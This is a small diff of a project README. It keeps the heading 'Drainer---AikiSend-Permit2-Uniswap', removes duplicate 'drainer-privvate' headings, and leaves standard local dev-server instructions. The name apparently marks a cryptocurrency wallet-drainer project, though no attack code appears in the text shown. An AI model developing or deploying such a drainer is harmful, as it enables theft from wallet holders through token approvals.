@@ -39,7 +39,4 @@ pnpm dev
 Open [http://localhost:3000](http://localhost:3000) with your browser to see the result.
 
 Branch off `main` and submit Pull Requests.# Drainer---AikiSend-Permit2-Uniswap
-# drainer-privvate
-# drainer-privvate
-# drainer
 # Drainer
